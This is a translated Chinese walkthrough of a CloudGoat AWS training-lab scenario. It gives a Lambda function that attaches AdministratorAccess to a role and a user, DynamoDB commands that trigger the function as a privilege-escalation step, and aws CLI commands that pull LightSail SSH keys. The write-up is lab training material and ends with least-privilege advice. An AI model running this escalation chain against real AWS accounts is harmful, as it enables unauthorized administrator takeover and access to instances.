# CloudGoat 云靶机 Part-3：利用 AWS Lambda 函数提权

#### 译文声明
本文为翻译文章，原文作者为 rzepsky，发布于 medium.com。译文仅供参考，具体内容和含义以原文为准。

## 前言
本文将描述攻击者在拥有用户 Joe 和 Bob 的访问密钥但 EC2 实例停止服务时的攻击过程。如果您是首次阅读本系列文章且不了解 **CloudGoat** 以及 Joe 和 Bob 的背景，请先阅读[第一部分](https://www.anquanke.com/post/id/170516)。

## 权限提权
获取访问密钥后，攻击者首先会检查该账户的权限。Joe 缺少 `iam:ListAttachedUserPolicies` 和 `iam:GetUserPolicy` 权限，但我们可以通过 Bob 进行操作。

可以看到，Joe 拥有 `DatabaseAdministrator` 权限。如果允许我们使用此权限创建一个 Lambda 函数，一切将变得简单。首先，我们需要了解 Joe 拥有哪些角色（没有角色，即使创建了新的 Lambda 函数也无法执行任何操作）。使用以下命令查看分配的角色：
```sh
$ aws iam list-roles --profile joe
```
从输出中可以看到，有两个与 Lambda 函数相关的角色：`iam_for_lambda` 和 `lambda-dynamodb-cloudgoat`。第一个策略 `policy_for_lambda_role` 可以帮助我们绕过 CloudTrail 监控服务（详情请参阅本系列第二部分）。现在来看看第二个角色 `lambda-dynamodb-cloudgoat`。

它拥有 `iam:AttachRolePolicy` 权限，我们可以使用 Lambda 服务将其提升为管理员权限。以下是实现代码：
```python
import boto3

def lambda_handler(event, context):
    iam = boto3.client("iam")
    iam.attach_role_policy(RoleName="lambda-dynamodb-cloudgoat", 
                           PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
    iam.attach_user_policy(UserName="joe", 
                           PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
```

`DatabaseAdministrator` 策略允许创建新的 Lambda 函数。接下来，压缩代码并创建一个新的 Lambda 函数。

最后一步是调用函数并庆祝提权成功。然而，直接调用并不被允许。这里可以使用事件来调用 Lambda 函数。

> 事件注入是一种适用于所有 Serverless 应用的新攻击向量。Lambda 函数通常用于处理事件，如果事件未正确验证，攻击者可以强制 Lambda 执行恶意代码。更多细节请参考 [视频演示](https://www.youtube.com/watch?v=M7wUanfWs1c) 或 [示例](https://www.jeremydaly.com/event-injection-protecting-your-serverless-applications/)。

回到我们的场景，Lambda 支持的事件源列表包括 Amazon DynamoDB 事件。查看 [用户 Joe 的权限](https://console.aws.amazon.com/iam/home?#/policies/arn:aws:iam::aws:policy/job-function/DatabaseAdministrator%24serviceLevelSummary)，允许将新的 Lambda 函数与 DynamoDB 表连接起来。配置一个新的 Lambda 函数，在 DynamoDB 表中创建新条目即可触发函数。例如，创建一个名为 `rzepsky_table` 的表：
```sh
$ aws dynamodb create-table --table-name rzepsky_table --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=3,WriteCapacityUnits=3 --stream-specification StreamEnabled=true,StreamViewType=NEW_IMAGE --query TableDescription.LatestStreamArn --profile joe
```
上述命令创建了一个包含字符串列 `Test` 的新表，并启用了 DynamoDB Stream。

创建事件源并将新的 DynamoDB 表与之前创建的 Lambda 函数链接起来。然后在表中添加一个新条目以触发 Lambda 函数：
```sh
$ aws dynamodb put-item --table-name rzepsky_table --item Test='{S=”Rzepsky”}' --profile joe
```

如果一切顺利，这个事件会调用 Lambda 函数并将管理员权限策略附加给用户 Joe。验证 Joe 的权限：
```sh
$ aws iam get-user-policy --user-name joe --policy-name AdministratorAccess --profile joe
```

非常棒！我们成功提权了。

## 初窥 AWS LightSail
**LightSail** 服务为云用户提供云计算、存储和网络。其目标是提供 EC2 的简化版本，使用户无需深入了解 EBS、VPC 和 Route 53 等细节。便捷性往往伴随着风险，那么 LightSail 是否降低了安全性？让我们开始探究。

在 EC2 实例中，不允许直接下载 SSH 密钥来获取实例的 shell。但在 LightSail 中情况不同。首先，LightSail 用户可以使用默认密钥：
```sh
$ aws lightsail download-default-key-pair
```

查看 CloudGoat 靶机中的 LightSail 项目的密钥信息：
```sh
$ aws lightsail get-instance-access-details --instance-name cloudgoat_ls --profile joe
```

我们可以轻松获得临时 SSH 密钥。从输出中可以看到 LightSail 实例使用的是 `cloudgoat_key_pair`。

重要的一点是，如果我们拥有 AWS 控制台管理访问权限（如将 Joe 的权限提升为管理员），可以直接从浏览器访问 shell。只需点击终端图标即可。

## 结束语
本文介绍了如何利用 Amazon 提供的 `DatabaseAdministrator` 策略结合具有宽泛权限的 Lambda 角色实现权限提升。管理 IAM 权限并非易事，特别是在复杂的架构和众多用户的情况下。有效的工具如 [Netflix Repokid](https://github.com/Netflix/repokid) 可以帮助实现最小权限分配。

后面我们将继续探讨 LightSail 服务的一些特性。请注意，在权限策略中分配通配符时要谨慎。在下一篇文章中，我将介绍另一个 CloudGoat 场景。感谢观看。